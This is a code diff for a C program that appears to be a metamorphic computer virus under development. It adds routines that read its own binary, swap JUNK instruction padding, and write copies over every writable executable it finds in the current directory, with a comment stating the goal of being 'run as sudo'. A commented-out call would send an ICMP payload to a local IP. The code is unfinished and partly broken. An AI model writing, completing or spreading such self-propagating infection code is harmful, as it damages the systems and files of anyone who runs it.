@@ -64,6 +64,16 @@ void writecode(const char *filename)
     free(newfilename);
 }
 
+void newwritecode(const char *filename)
+{
+    FILE *fp;
+    /* Opens file with write to binary permissions */
+    fp = fopen(filename, "ab");          JUNK;
+    /* Writes the code variable into the file */
+    fwrite(code, codelen, 1, fp);           JUNK;
+    fclose(fp);
+}
+
 int writeinstruction(unsigned reg, int offset, int space)
 {
     if (space < 2)
@@ -163,7 +173,45 @@ char* read_file(const char *filename)
     /* Reads the file into the code variable in memory */
     fread(str, strlen, 1, fp);        JUNK;
 
+
+    // TODO: close file
+
     return str;
+}
+
+char* read_binary_file(const char *filename)
+{
+    unsigned char *str;
+    int strlen;
+    /* Opens file, rb represents read and binary */
+    FILE *fp = fopen(filename, "rb");   JUNK;
+    /* Sets the file position of the stream to the given offset (0 long int) */
+    fseek(fp, 0L, SEEK_END);            JUNK;
+    /* Sets the length of the code  */
+    strlen = ftell(fp);
+    /* Allocates memory to the length of the code */
+    str = malloc(strlen);             JUNK;
+    /* Gets the file position of the stream to the start of the file */
+    fseek(fp, 0L, SEEK_SET);
+    /* Reads the file into the code variable in memory */
+    fread(str, strlen, 1, fp);        JUNK;
+
+
+    // TODO: close file
+    fclose(fp);
+
+    return str;
+}
+
+void write_binary_file(const char *filename, const char *data)
+{
+    FILE *fp;
+    /* Gets the last character of the fname to copy */
+    /* Opens file with write to binary permissions */
+    fp = fopen(filename, "wb");
+    /* Writes the code variable into the file */
+    fwrite(data, strlen(data), 1, fp);
+    fclose(fp);
 }
 
 void send_ping(const char *cmd)
@@ -207,11 +255,46 @@ void execute()
 // Propagate into executable files in hopes of being run as sudo
 void propagate()
 {
+}
 
+void embed_code(const char *filename)
+{
+    unsigned char *existing;
+    int existing_len;
+
+    code = read_binary_file("a.out");
+    codelen = strlen(code);
+    printf("%d", codelen);
+    replacejunk();
+    write_binary_file("m.exe", code);
+
+    // printf(existing);
+
+    // FILE *fp;
+
+    // fp = fopen(filename, "w+");
+    // if (fp == NULL)
+    // {
+    //     printf("NULL");
+    //     return;
+    // }
+
+    // char *bash_code = "sudo ./%s";
+
+    // int embedded_code_len = strlen(filename) + strlen(bash_code) + 1;
+    // char embedded_code[embedded_code_len];
+
+    // sprintf(embedded_code, bash_code, filename);
+
+    // printf("\n\nCMD: %s\n", embedded_code);
+
+    // fp = fopen(filename, "w+");
+    // fprintf(fp, embedded_code);
+    // fclose(fp);
 }
 
 // Lists files in passed in directory path
-void list_files(const char *path) {
+void list_files(const char *path, const char *exclude) {
 DIR *dir;
     struct dirent *ent;
 
@@ -224,10 +307,24 @@ DIR *dir;
             // regular files only - no DT_DIR (directories) or DT_LNK (links)
             if (ent->d_type == DT_REG)
             {
-                printf("%s", ent->d_name);
+                //printf("%s", ent->d_name);
                 if (access(ent->d_name, X_OK) == 0 && access(ent->d_name, W_OK) == 0)
                 {
-                    printf(" - Writable Executable");
+                    if (strstr(exclude, ent->d_name) != NULL)
+                    {
+                        printf("Self executable is ignored: %s", ent->d_name);
+
+                        unsigned char *existing;
+                        int existing_len;
+                        readcode(ent->d_name);
+                        printf("Existing %s Len: %d", code, codelen);
+                    }
+                    else
+                    {
+                        embed_code(ent->d_name);
+                        printf("Propagated into: %s\n", ent->d_name);
+                    }
+                    
                 }
                 printf("\n");
             }
@@ -242,16 +339,19 @@ DIR *dir;
     }
 }
 
-// Should check before executing if root privelege
+// Should check before executing if root privilege
 int main(int argc, char* argv[])
 {
+    printf("EXE FILE: %s\n", argv[0]);
     system("id -u"); // outputs 0 if root user
     //execute("192.168.1.142"); // send ICMP ping with custom payload to IP
-    list_files("./"); // list writable executable files for propagation
-
+    list_files("./", argv[0]); // list writable executable files for propagation
+    //propagate();
     //readcode(argv[0]);  JUNK;
     //replacejunk();      JUNK;
     //writecode(argv[0]); JUNK;
-
+    newwritecode("code.out"); JUNK;
+    //readcode(argv[0]);
+    printf("%s:%d", code, codelen);
     return 0;
 }
